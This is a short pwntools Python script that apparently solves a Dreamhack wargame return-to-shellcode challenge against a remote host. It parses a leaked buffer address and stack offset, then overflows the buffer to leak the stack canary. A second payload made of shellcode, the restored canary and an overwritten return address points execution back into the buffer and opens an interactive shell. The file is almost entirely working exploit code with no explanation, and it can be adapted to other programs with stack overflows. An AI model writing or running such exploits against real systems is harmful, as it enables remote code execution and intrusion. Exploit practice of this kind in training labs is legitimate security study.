#! /usr/bin/env python3
# name: remote_r2s.py
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = remote("host3.dreamhack.games", 17656)

context.arch = 'amd64'

p.recvuntil(b'buf: ')
buf_addr = int(p.recvline()[:-1], 16)
p.recvuntil(b'$rbp: ')
buf2sfp = int(p.recvline()[:-1])
buf2cnry = buf2sfp - 8

slog('buf address', buf_addr)
slog('buf <--> sfp', buf2sfp)
slog('buf <--> canary', buf2cnry)

payload = b'A' * (buf2cnry + 1)

p.sendafter(b'Input:', payload)
p.recvuntil(payload)

cnry= u64(b'\x00' + p.recvn(7))
slog('canary ', cnry)

# Exploit
sh = asm(shellcraft.sh())

exploit = sh.ljust(buf2cnry, b'A') + p64(cnry) + b'B' * 8 + p64(buf_addr)

p.sendlineafter(b'Input:', exploit)

p.interactive()



























